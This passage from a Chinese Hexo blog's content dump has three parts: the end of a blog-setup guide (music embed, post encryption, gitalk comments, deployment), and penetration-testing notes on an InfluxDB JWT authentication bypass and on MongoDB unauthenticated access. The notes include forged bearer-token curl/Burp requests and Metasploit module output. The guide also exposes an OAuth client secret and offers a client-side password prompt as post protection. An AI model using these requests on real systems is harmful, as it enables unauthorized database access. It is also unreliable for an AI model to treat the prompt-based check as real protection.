href="#生成外链代码" class="headerlink" title="生成外链代码"></a>生成外链代码</h5><p>在<a href="https://music.163.com/">网易云音乐</a> 搜索一个作为背景音乐的歌曲，并进入播放页面，点击 <strong>生成外链播放器</strong></p><p><img src="../images/hexo-5.png" alt="hexo-5"></p><h5 id="插入js脚本"><a href="#插入js脚本" class="headerlink" title="插入js脚本"></a>插入js脚本</h5><p>给在第6步的外链代码进行优化如下，在**/Mr-Framework/themes/3-hexo/layout/_partial/footer.ejs**末尾添加下列代码</p><pre><code class="html">&lt;div id=&quot;musicMouseDrag&quot; style=&quot;position:fixed; z-index: 9999; bottom: 0; right: 0;&quot;&gt;                                                                                       &lt;!--默认style是底部bottom,右下角right --&gt;    &lt;div id=&quot;musicDragArea&quot; style=&quot;position: absolute; top: 0; left: 0; width: 100%;height: 10px;cursor: move; z-index: 10;&quot;&gt;       &lt;/div&gt;         &lt;!--网易云外链放在此处--&gt;  &lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=150 height=40 src=&quot;//music.163.com/outchain/player?type=2&amp;id=1373296&amp;auto=1&amp;height=32&quot;&gt;   &lt;/iframe&gt;&lt;/div&gt;&lt;!--以下代码是为了支持随时拖动音乐控件的位置，如没有需求，可去掉下面代码--&gt;&lt;!--但是好像不能用 --&gt;&lt;script&gt;var $DOC = $(document)$(&#39;#musicMouseDrag&#39;).on(&#39;mousedown&#39;, function (e) &#123;// 阻止文本选中$DOC.bind(&quot;selectstart&quot;, function () &#123;return false;&#125;);$(&#39;#musicDragArea&#39;).css(&#39;height&#39;, &#39;100%&#39;);var $moveTarget = $(&#39;#musicMouseDrag&#39;);$moveTarget.css(&#39;border&#39;, &#39;1px dashed grey&#39;)var div_x = e.pageX - $moveTarget.offset().left;var div_y = e.pageY - $moveTarget.offset().top;$DOC.on(&#39;mousemove&#39;, function (e) &#123;var targetX = e.pageX - div_x;var targetY = e.pageY - div_y;targetX = targetX &lt; 0 ? 0 : (targetX + $moveTarget.outerWidth() &gt;= window.innerWidth) ? window.innerWidth - $moveTarget.outerWidth() : targetX;targetY = targetY &lt; 0 ? 0 : (targetY + $moveTarget.outerHeight() &gt;= window.innerHeight) ? window.innerHeight - $moveTarget.outerHeight() : targetY;$moveTarget.css(&#123;&#39;left&#39;: targetX + &#39;px&#39;, &#39;top&#39;: targetY + &#39;px&#39;, &#39;bottom&#39;: &#39;inherit&#39;, &#39;right&#39;: &#39;inherit&#39;&#125;)&#125;).on(&#39;mouseup&#39;, function () &#123;$DOC.unbind(&quot;selectstart&quot;);$DOC.off(&#39;mousemove&#39;)$DOC.off(&#39;mouseup&#39;)$moveTarget.css(&#39;border&#39;, &#39;none&#39;)$(&#39;#musicDragArea&#39;).css(&#39;height&#39;, &#39;10px&#39;);&#125;)&#125;)&lt;/script&gt;</code></pre><h4 id="给博文加密🔐-hexo-blog-encrypt-功能暂未配置正确"><a href="#给博文加密🔐-hexo-blog-encrypt-功能暂未配置正确" class="headerlink" title="给博文加密🔐-hexo-blog-encrypt-功能暂未配置正确"></a>给博文加密🔐-hexo-blog-encrypt-功能暂未配置正确</h4><h5 id="安装hexo-blog-encrypt插件"><a href="#安装hexo-blog-encrypt插件" class="headerlink" title="安装hexo-blog-encrypt插件"></a>安装<strong>hexo-blog-encrypt</strong>插件</h5><pre><code class="zsh">npm install hexo-blog-encrypt </code></pre><h5 id="网站根目录下的-config-yml文件配置，添加如下字段"><a href="#网站根目录下的-config-yml文件配置，添加如下字段" class="headerlink" title="网站根目录下的_config.yml文件配置，添加如下字段"></a>网站根目录下的_config.yml文件配置，添加如下字段</h5><pre><code class="yml"># Securityencrypt: # hexo-blog-encrypt  abstract: 有东西被加密了, 请输入密码查看.  message: 您好, 这里需要密码.  tags:  - &#123;name: tagName, password: 密码A&#125;  - &#123;name: tagName, password: 密码B&#125;  template: &lt;div id=&quot;hexo-blog-encrypt&quot; data-wpm=&quot;&#123;&#123;hbeWrongPassMessage&#125;&#125;&quot; data-whm=&quot;&#123;&#123;hbeWrongHashMessage&#125;&#125;&quot;&gt;&lt;div class=&quot;hbe-input-container&quot;&gt;&lt;input type=&quot;password&quot; id=&quot;hbePass&quot; placeholder=&quot;&#123;&#123;hbeMessage&#125;&#125;&quot; /&gt;&lt;label&gt;&#123;&#123;hbeMessage&#125;&#125;&lt;/label&gt;&lt;div class=&quot;bottom-line&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;script id=&quot;hbeData&quot; type=&quot;hbeData&quot; data-hmacdigest=&quot;&#123;&#123;hbeHmacDigest&#125;&#125;&quot;&gt;&#123;&#123;hbeEncryptedData&#125;&#125;&lt;/script&gt;&lt;/div&gt;  wrong_pass_message: 抱歉, 这个密码看着不太对, 请再试试.  wrong_hash_message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.   silent: true   # 禁用日志输出</code></pre><h5 id="博文front-matter配置"><a href="#博文front-matter配置" class="headerlink" title="博文front-matter配置"></a>博文front-matter配置</h5><pre><code class="markdown">---title: Hello Worldtags:- 作为日记加密date: 2016-03-30 21:12:21password: mikemessiabstract: 有东西被加密了, 请输入密码查看.message: 您好, 这里需要密码.wrong_pass_message: 抱歉, 这个密码看着不太对, 请再试试.wrong_hash_message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.---</code></pre><h5 id="禁用tag加密🔐"><a href="#禁用tag加密🔐" class="headerlink" title="禁用tag加密🔐"></a>禁用tag加密🔐</h5><pre><code class="markdown">---title: Callback Testdate: 2019-12-21 11:54:07tags:    - A Tag should be encryptedpassword: &quot;&quot;---Use a &quot;&quot; to diable tag encryption.</code></pre><h5 id="禁用标签tag加密配置"><a href="#禁用标签tag加密配置" class="headerlink" title="禁用标签tag加密配置"></a>禁用标签tag加密配置</h5><p> 在md文章中front-matter中设置如下</p><pre><code class="yml">---title: Callback Testdate: 2019-12-21 11:54:07tags:    - A Tag should be encryptedpassword: &quot;&quot;---Use a &quot;&quot; to diable tag encryption.</code></pre><h4 id="给博文加密🔐-hexo-encrypt-正常配置"><a href="#给博文加密🔐-hexo-encrypt-正常配置" class="headerlink" title="给博文加密🔐-hexo-encrypt-正常配置"></a>给博文加密🔐-hexo-encrypt-正常配置</h4><h5 id="安装hex-encrypt"><a href="#安装hex-encrypt" class="headerlink" title="安装hex-encrypt"></a>安装hex-encrypt</h5><pre><code class="zsh">npm install hexo-encrypt  # 安装hexo-encrypt依赖包</code></pre><h5 id="配置站点配置文件"><a href="#配置站点配置文件" class="headerlink" title="配置站点配置文件"></a>配置站点配置文件</h5><blockquote><p>Mr-Framework/_config.yml 新增如下字段</p></blockquote><pre><code class="yml">encrypt:   password: 123456   # 默认密码</code></pre><h5 id="博文头部front-matter配置"><a href="#博文头部front-matter配置" class="headerlink" title="博文头部front-matter配置"></a>博文头部front-matter配置</h5><pre><code class="markdown">---encrypt: trueenc_pwd: 123---enc_pwd不写，则是默认配置文件里的123456密码</code></pre><h5 id="加密界面微调"><a href="#加密界面微调" class="headerlink" title="加密界面微调"></a>加密界面微调</h5><pre><code class="javascript">/***Mr-Framework/node_modules/hexo-encrypt/lib/conf_post.js***/    if (this.template == undefined || this.template == &#39;&#39;) &#123;        this.template = &#39; &lt;input id=&quot;enc_pwd_input&quot; type=&quot;password&quot; style=&quot;&#39; +                  &#39;border-radius: 5px;&#39; +                  &#39;background-color: white;&#39; +  /*  密码输入框背景颜色 浅绿色 #E8FFE8   */                  &#39;border-style: groove;&#39; +                   &#39;height: 30px;&#39; +                   &#39;width: 50%;&#39; +                   &#39;cursor: auto;&#39; +                   &#39;font-size: 102%;&#39; +                   &#39;color: currentColor;&#39; +        /* 密文字体*的颜色   默认为currentColor */                  &#39;outline: none;&#39; +                   &#39;text-overflow: initial;&#39; +                   &#39;padding-left: 5px;&quot; onkeydown=&quot;if (event.keyCode == 13) &#123; decrypt(); return false;&#125;&quot;&gt; &#39; +               &#39;&lt;input type=&quot;submit&quot; value=&quot;解&amp;nbsp;密&quot; onclick=&quot;decrypt()&quot; style=&quot;&#39; +                   &#39;width: 58px;&#39; +                   &#39;height: 34px;&#39; +                   &#39;border-radius: 5px;&#39; +                   &#39;background-color: #32414e;&#39; +  /*  提交按钮背景颜色    */                  &#39;border-style: solid;&#39; +                   &#39;color: white;&#39; +    /* 字体的颜色   默认为currentColor */                  &#39;&quot;&gt;&#39; +               &#39;&lt;div id=&quot;enc_error&quot; style=&quot;&#39; +                   &#39;display: inline-block;&#39; +                  &#39;color: #d84527;&#39; +                   &#39;margin-left: 10px&#39; +                  &#39;&quot;&gt;&lt;/div&gt;\n&#39; +              &#39;&lt;script&gt;\n&#39; +                 &#39;var onError = function(error) &#123;\n&#39; +                &#39;    document.getElementById(&quot;enc_error&quot;).innerHTML = &quot;password error!&quot;\n&#39; +                &#39;&#125;;\n&#39; +                &#39;function decrypt() &#123;\n&#39; +                     &#39;var passwd = document.getElementById(&quot;enc_pwd_input&quot;).value;\n&#39; +                     &#39;console.log(passwd);\n&#39; +                     &#39;doDecrypt(passwd, onError);\n&#39; +                 &#39;&#125;\n&#39; +               &#39;&lt;/script&gt;\n&#39;;    &#125;</code></pre><h4 id="手动添加js代码实现博文加密加密"><a href="#手动添加js代码实现博文加密加密" class="headerlink" title="手动添加js代码实现博文加密加密"></a>手动添加js代码实现博文加密加密</h4><pre><code class="javascript">/* 在Mr-Framework/themes/3-hexo/layout/_partial/header.ejs末尾添加如下js脚本  */#JavaScript&lt;script&gt;    (function()&#123;        if(&#39;&#123;&#123; page.password &#125;&#125;&#39;)&#123;            if (prompt(&#39;请输入密码&#39;) !== &#39;&#123;&#123; page.password &#125;&#125;&#39;)&#123;                alert(&#39;密码错误&#39;);                history.back();            &#125;        &#125;    &#125;)();&lt;/script&gt;</code></pre><h4 id="评论系统gitalk配置"><a href="#评论系统gitalk配置" class="headerlink" title="评论系统gitalk配置"></a>评论系统gitalk配置</h4><h5 id="注册OAuth-Application"><a href="#注册OAuth-Application" class="headerlink" title="注册OAuth Application"></a>注册OAuth Application</h5><p><a href="https://github.com/settings/applications/new">点击此处</a> 来注册一个新的 OAuth Application。</p><p><img src="../images/hexo-6.png" alt="hexo-6"></p><h5 id="修改主题配置文件"><a href="#修改主题配置文件" class="headerlink" title="修改主题配置文件"></a>修改主题配置文件</h5><blockquote><p> /Mr-Framework/themes/3-hexo/_config.yml</p></blockquote><pre><code class="yml">##########评论设置#############comment:  on: true  type: gitalk  # 评论系统：gitalk、disqus、gitment、utteranc、livere,注意：使用时，在下方对应位置进行配置  comment_count: true  # 文章标题下方显示评论数 目前仅支持 gitalk 和 disqus  ## 使用说明 https://yelog.org//2020/05/23/3-hexo-comment/# 各评论系统配置 ↓↓gitalk:  githubID: askDing    # githubID: github用户名  repo: askDing.github.io  # repo: 使用哪个仓库的issue  ClientID:  3675559917bdc294608c  #  创建 OAuth application 就会生成：  ClientSecret: a826e0ded6d8b29a5bb77843f4c3805ecf7b263f   #  创建 OAuth application 就会生成  adminUser: askDing # 使用自己的 github 用户名即可   distractionFreeMode: true    # 全屏遮罩效果  language: zh-CN   # 支持：en / zh-CN / zh-TW 三种  perPage: 10   # 每次加载的数据大小，默认10，最大100</code></pre><pre><code class="zsh">npm install gitalk  # 安装gitalk模块</code></pre><p>更多评论配置请查看<a href="https://yelog.org/2020/05/23/3-hexo-comment/">叶落阁</a></p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="Github部署"><a href="#Github部署" class="headerlink" title="Github部署"></a>Github部署</h3><h4 id="配置deploy"><a href="#配置deploy" class="headerlink" title="配置deploy"></a>配置deploy</h4><pre><code class="yml"># Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:  type: &#39;git&#39;  repository: https://github.com/askDing/askDing.github.io.git  branch: master</code></pre><pre><code class="zsh">npm install hexo-deployer-git. # 安装git部署插件hexo d # 部署到github</code></pre><h4 id="备份博客"><a href="#备份博客" class="headerlink" title="备份博客"></a>备份博客</h4><pre><code class="zsh">cd Mr-Framework &amp;&amp; git init   #进入博客目录并初始化gitgit remote add origin https://github.com/askDing/Mr.Framework.git  # 添加远程git仓库git add . &amp;&amp; git commit -m &quot;My Blog Backup&quot;   # 初次提交到本地暂缓区git push --set-upstream origin master  # 设置上游分支git push origin master  # 上传到Githubhexo clean &amp;&amp; hexo g &amp;&amp; hexo d &amp;&amp; git add . &amp;&amp; git commit -m &quot; `date` &quot; &amp;&amp; git push -f  # 部署到Github并进行备份</code></pre><h4 id="快捷命令"><a href="#快捷命令" class="headerlink" title="快捷命令"></a>快捷命令</h4><blockquote><p>在.zshrc中添加</p></blockquote><pre><code class="zsh">alias hs=&#39;cd ~/Mr-Framework &amp;&amp; hexo clean &amp;&amp; hexo g &amp;&amp; hexo s&#39;    # 启动本地服务alias hdb=&#39;cd ~/Mr-Framework &amp;&amp; hexo clean &amp;&amp; hexo g &amp;&amp; hexo d &amp;&amp; git add . &amp;&amp; git commit -m &quot; Mr.Framework updated: `date` &quot; &amp;&amp; git push -f&#39;    # 部署到Github并进行备份</code></pre><h3 id="Coding部署-1"><a href="#Coding部署-1" class="headerlink" title="Coding部署-1"></a>Coding部署-1</h3><p><strong>5. 开启coding pages服务，绑定域名</strong></p><p>如图：</p><p><img src="../images/hexo-7.jpg" alt="hexo-7"></p><p><strong>6. 阿里云添加解析</strong></p><p><img src="../images/hexo-8.jpg" alt="hexo-8"></p><p>这个时候就可以把之前github的解析改成境外，把coding的解析设为默认了。</p><p><strong>7. 去除coding page的跳转广告</strong></p><p>coding page的一个比较恶心人的地方就是，你只是银牌会员的话，访问会先跳转到一个广告，再到你自己的域名。那么它也给出了消除的办法。右上角切换到coding的旧版界面，默认新版是不行的。然后再来到<code>pages服务</code>这里。</p><p>这里：</p><p><img src="../images/hexo-9.jpg" alt="hexo-9"></p><p>只要你在页面上添加一行文字，写<code>Hosted by Coding Pages</code>，然后点下面的小勾勾，两个工作日内它就会审核通过了。</p><pre><code class="text">&lt;p&gt;Hosted by &lt;a href=&quot;https://pages.coding.me&quot; style=&quot;font-weight: bold&quot;&gt;Coding Pages&lt;/a&gt;&lt;/p&gt;</code></pre><p>我的选择是把这一行代码放在主题文件夹<code>/layout/common/footer.ejs</code>里面，也就是本来在页面中看到的页脚部分。</p><p><img src="../images/hexo-10.jpg" alt="hexo-10"></p><p>当然，为了统一，我又在后面加上了and <strong>Github</strong>哈哈，可以不加。</p><pre><code class="text">&lt;p&gt;&lt;span&gt;Hosted by &lt;a href=&quot;https://pages.coding.me&quot; style=&quot;font-weight: bold&quot;&gt;Coding Pages&lt;/a&gt;&lt;/span&gt; and &lt;span&gt;&lt;a href=&quot;https://github.com&quot; style=&quot;font-weight: bold&quot;&gt;Github&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;</code></pre><p>这是最终加上去的代码。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="Markdown编辑器配置-Typora"><a href="#Markdown编辑器配置-Typora" class="headerlink" title="Markdown编辑器配置-Typora"></a>Markdown编辑器配置-Typora</h2><h3 id="Preferences"><a href="#Preferences" class="headerlink" title="Preferences"></a>Preferences</h3><ul><li><p>General</p><ul><li>On Lauch  &gt;open custom folder  set <strong>source</strong> of the hexo blog folder</li><li>Save &amp; Recover &gt; ☑️ Save without asking when switch files on side panel</li></ul></li><li><p>Apperarance</p><ul><li>Font Size &gt; ☑️ Auto      </li><li>Themes<ul><li>Open Theme Folder  Downloaded from <a href="https://typora.io/">typora</a></li></ul></li></ul></li><li><p>Editor</p><ul><li>Indent Size on Save <ul><li>Auto ☑️ Pretty indentation</li><li>Auto Pair<ul><li>☑️ Auto pair brackets and quotes</li><li>☑️ Auto pair common Markdown syntax</li><li>Default Copy Behavior<ul><li>☑️ Copy Markdown source as plain text</li></ul></li></ul></li></ul></li></ul></li><li><p>Image</p><ul><li>When Insert ...<pre><code>- Copy image to custom folder- ../imges- ☑️ Apply above rules to local images- ☑️ Apply above rules to online images- ☑️ User relative path if possible- ☑️Auto escape image URL when insert  </code></pre></li></ul></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Evolution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>InfluxDB</title>
      <link href="Kali/Exploit/InfluxDB.html"/>
      <url>Kali/Exploit/InfluxDB.html</url>
      
        <content type="html"><![CDATA[<p><code>influxdb</code> 是针对时间戳或时间序列数据进行优化的的<code>开源时序数据库</code>,<br>    由Go语言编写，广泛应用于存储系统的监控数据、loT行业的实时数据等，处理高写入和高查询负载。</p><p>端口服务</p><ul><li><code>8083</code> Web admin管理服务端口</li><li><code>8086</code> HTTP API的端口</li><li><code>8088</code> 集群端口</li><li><code>9096</code> 中继端口</li></ul><blockquote><p>InfluxDB 1.x HTTP 端点</p></blockquote><table><thead><tr><th>Endpoint</th><th>Description</th></tr></thead><tbody><tr><td>/debug/pprof</td><td>Generate profiles for troubleshooting</td></tr><tr><td>/debug/requests</td><td>Track HTTP client requests to the /write and /query endpoints</td></tr><tr><td>/debug/vars</td><td>Collect internal InfluxDB statistics</td></tr><tr><td>/ping</td><td>Check the status of your InfluxDB instance and your version of InfluxDB</td></tr><tr><td>/query</td><td>Query data using InfluxQL, manage databases, retention policies, and users</td></tr><tr><td>/write</td><td>Write data to a database</td></tr></tbody></table><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap -sV -Pn -T4 -sSU -p 8086 -sC    10.199.18.8                                                           Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 16:31 CSTNmap scan report for 10.199.18.8Host is up (0.057s latency).PORT     STATE         SERVICE VERSION8086/tcp open          http    InfluxDB http admin 1.2.4|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).8086/udp open|filtered d-s-nNmap done: 1 IP address (1 host up) scanned in 113.41 seconds</code></pre><p>debug调试信息泄漏</p><pre><code>http://10.199.18.7:8086/debug/vars http://10.199.18.7:8086/debug/pprof/heap http://10.199.18.7:8086/debug/pprof/goroutine http://10.199.18.7:8086/debug/pprof/goroutine?debug=1 http://10.199.18.7:8086/debug/pprof/block http://10.199.18.7:8086/debug/pprof/profile http://10.199.18.7:8086/debug/pprof/threadcreate</code></pre><h2 id="influxdb认证绕过漏洞"><a href="#influxdb认证绕过漏洞" class="headerlink" title="influxdb认证绕过漏洞"></a>influxdb认证绕过漏洞</h2><p>InfluxDB使用jwt作为鉴权方式。<br>在用户开启了认证，但未设置参数shared-secret的情况下，<code>JWT token shared-secret</code> 默认为空，<br>此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。</p><h3 id="curl命令复现"><a href="#curl命令复现" class="headerlink" title="curl命令复现"></a><code>curl</code>命令复现</h3><blockquote><p>服务器未配置身份认证时可直接进行数据库相关操作</p></blockquote><pre><code class="zsh">curl  &quot;http://10.199.18.7:8086/debug/requests&quot;curl -G &#39;http://10.199.18.7:8086/query&#39; --data-urlencode &#39;q=show users&#39;                    # 服务器未配置认证可直接查询&#123;&quot;results&quot;:[&#123;&quot;statement_id&quot;:0,&quot;series&quot;:[&#123;&quot;columns&quot;:[&quot;user&quot;,&quot;admin&quot;]&#125;]&#125;]&#125;curl -G &#39;http://10.199.18.7:8086/query&#39; --data-urlencode &#39;q=show databases&#39;        # 查询数据库&#123;&quot;results&quot;:[&#123;&quot;statement_id&quot;:0,&quot;series&quot;:[&#123;&quot;name&quot;:&quot;databases&quot;,&quot;columns&quot;:[&quot;name&quot;],&quot;values&quot;:[[&quot;gnocchi&quot;],[&quot;_internal&quot;],[&quot;test11&quot;]]&#125;]&#125;]&#125;</code></pre><blockquote><p>服务器配置身份认证，但<code>JWT token shared-secret</code> 默认为空时</p></blockquote><p>构造<a href="https://jwt.io/">JWT Token</a></p><p><img src="../images/influxdb-1.png" alt="influxdb-1"></p><p>发送POC</p><pre><code class="zsh">curl -G &#39;http://xxx:8086/query&#39;  -v \    --data-urlencode &#39;q=show users&#39; \     -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNTU5Mjg0OTM1fQ.tUClNot9LgStSw57n26DSn-3NPkBiHizk-XOHMfJJJw&#39;# output&#123;&quot;results&quot;:[&#123;&quot;statement_id&quot;:0,&quot;series&quot;:[&#123;&quot;columns&quot;:[&quot;user&quot;,&quot;admin&quot;],&quot;values&quot;:[[&quot;admin&quot;,true],[&quot;read&quot;,false],[&quot;write&quot;,false],[&quot;telegraf&quot;,true]]&#125;]&#125;]&#125;</code></pre><h3 id="BurpSuite复现"><a href="#BurpSuite复现" class="headerlink" title="BurpSuite复现"></a>BurpSuite复现</h3><pre><code class="zsh">POST /query HTTP/1.1Host: your-ipAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6AUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 22q=show%20users</code></pre><p><img src="../images/influxdb-2.png" alt="influxdb-2"></p><h2 id="MSF相关模块利用"><a href="#MSF相关模块利用" class="headerlink" title="MSF相关模块利用"></a>MSF相关模块利用</h2><pre><code class="zsh">msf6 auxiliary(scanner/http/influxdb_enum) &gt; show optionsModule options (auxiliary/scanner/http/influxdb_enum):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   PASSWORD   root             yes       The password to login with   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]   QUERY      SHOW DATABASES   yes       The influxdb query syntax   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT      8086             yes       The target port (TCP)   SSL        false            no        Negotiate SSL/TLS for outgoing connections   TARGETURI  /                yes       Path to list all the databases   USERNAME   root             yes       The username to login as   VHOST                       no        HTTP server virtual hostmsf6 auxiliary(scanner/http/influxdb_enum) &gt; set rhosts 10.199.18.7rhosts =&gt; 10.199.18.7msf6 auxiliary(scanner/http/influxdb_enum) &gt; run[*] Running module against 10.199.18.7[+] 10.199.18.7:8086 - Influx Version: 1.2.4[+] File saved in: /Users/ethan/.msf4/loot/20201202195840_default_10.199.18.7_influxdb.enum_380609.txt[*] Auxiliary module execution completed</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB</title>
      <link href="Kali/Exploit/MongoDB.html"/>
      <url>Kali/Exploit/MongoDB.html</url>
      
        <content type="html"><![CDATA[<p>MongoDB 是一个由<code>C++</code>语言编写,<br>   基于<code>分布式文件存储</code>的数据库,<br>   旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。<br>   介于<code>关系数据库和非关系数据库</code>之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh"> sudo nmap -sV -Pn -T4 -sSU -p 27017 --script mongodb-databases   10.196.20.1PORT      STATE         SERVICE VERSION27017/tcp open          mongodb MongoDB 3.6.12| mongodb-databases:|   totalSize = 2633728.0|   databases|     0|       empty = false|       name = admin|       sizeOnDisk = 131072.0|     1|       empty = false|       name = config|       sizeOnDisk = 86016.0| mongodb-info:|   MongoDB Build info|     javascriptEngine = mozjs|     buildEnvironment|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0|       target_os = linux|       target_arch = x86_64|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0|       distmod = ubuntu1604|       distarch = x86_64|     gitVersion = c2b9acad0248ca06b14ef1640734b5d0595b55f1|     bits = 64|     maxBsonObjectSize = 16777216|     debug = false</code></pre><h2 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h2><p>  开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。<br>  造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。</p><h3 id="MongoDB客户端探测"><a href="#MongoDB客户端探测" class="headerlink" title="MongoDB客户端探测"></a>MongoDB客户端探测</h3><pre><code class="zsh">mongo 10.196.20.1:27017mongodb&gt;show dbs</code></pre><h3 id="MSF模块利用"><a href="#MSF模块利用" class="headerlink" title="MSF模块利用"></a>MSF模块利用</h3><h4 id="MSF登陆模块mongodb-login"><a href="#MSF登陆模块mongodb-login" class="headerlink" title="MSF登陆模块mongodb_login"></a>MSF登陆模块mongodb_login</h4><pre><code class="zsh">msf6 auxiliary(scanner/mongodb/mongodb_login) &gt; show optionsModule options (auxiliary/scanner/mongodb/mongodb_login):   Name              Current Setting  Required  Description   ----              ---------------  --------  -----------   BLANK_PASSWORDS   false            no        Try blank passwords for all users   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5   DB                admin            yes       Database to use   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database   DB_ALL_PASS       false            no        Add all passwords in the current database to the list   DB_ALL_USERS      false            no        Add all users in the current database to the list   PASSWORD                           no        A specific password to authenticate with   PASS_FILE                          no        File containing passwords, one per line   RHOSTS            10.196.20.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT             27017            yes       The target port (TCP)   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host   THREADS           1                yes       The number of concurrent threads (max one per host)   USERNAME                           no        A specific username to authenticate as   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line   USER_AS_PASS      false            no        Try the username as the password for all users   USER_FILE                          no        File containing usernames, one per line   VERBOSE           true             yes       Whether to print output for all attemptsmsf6 auxiliary(scanner/mongodb/mongodb_login) &gt; run[*] 10.196.20.1:27017 - Scanning IP: 10.196.20.1[+] 10.196.20.1:27017 - Mongo server 10.196.20.1 doesn&#39;t use authentication[*] 10.196.20.1:27017 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul><li>修改默认端口</li><li>禁止开发服务到公网<br><code>bind_ip=127.0.0.1</code></li><li>禁用HTTP和REST端口</li><li>为MongoDB添加认证<br>  添加<code>--auth</code>参数</li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis</title>
      <link href="Kali/Exploit/Redis.html"/>
      <url>Kali/Exploit/Redis.html</url>
      
